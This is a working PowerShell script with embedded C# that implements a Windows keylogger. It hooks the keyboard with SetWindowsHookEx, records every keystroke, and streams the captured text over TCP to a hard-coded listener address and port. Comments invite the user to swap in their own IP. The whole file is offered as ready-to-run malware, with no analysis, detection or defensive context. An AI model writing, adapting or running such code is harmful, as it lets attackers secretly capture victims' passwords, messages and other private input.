# Keylogger_Netcat.ps1
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Text;

public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string targetIP = "192.168.8.199"; // Replace with your IP
    private static int targetPort = 4444; // Replace with your port
    private static TcpClient client;
    private static NetworkStream stream;
    private static string buffer = "";

    public static void Start() {
        try {
            client = new TcpClient(targetIP, targetPort);
            stream = client.GetStream();
            SendData("=== Keylogger Started ===");
        } catch {
            // If connection fails, fall back to file logging
        }
        
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static void SendData(string data) {
        try {
            if (stream != null && client.Connected) {
                byte[] bytes = Encoding.ASCII.GetBytes(data + Environment.NewLine);
                stream.Write(bytes, 0, bytes.Length);
                stream.Flush();
            }
        } catch {
            // Connection lost
            try {
                if (client != null) client.Close();
            } catch {}
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            
            // Convert special keys to readable format
            switch(key) {
                case "Space": key = " "; break;
                case "Return": key = "[ENTER]"; break;
                case "Back": key = "[BACKSPACE]"; break;
                case "Tab": key = "[TAB]"; break;
                case "Capital": key = "[CAPSLOCK]"; break;
                case "LShiftKey":
                case "RShiftKey":
                case "LControlKey":
                case "RControlKey":
                case "LMenu":
                case "RMenu":
                    return CallNextHookEx(_hookID, nCode, wParam, lParam); // Skip modifier keys
            }
            
            buffer += key;
            
            // Send data every 50 characters or on special keys
            if (buffer.Length >= 50 || key.Contains("[") || key == " ") {
                SendData(buffer);
                buffer = "";
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@

# Start the keylogger
[KeyLogger]::Start()
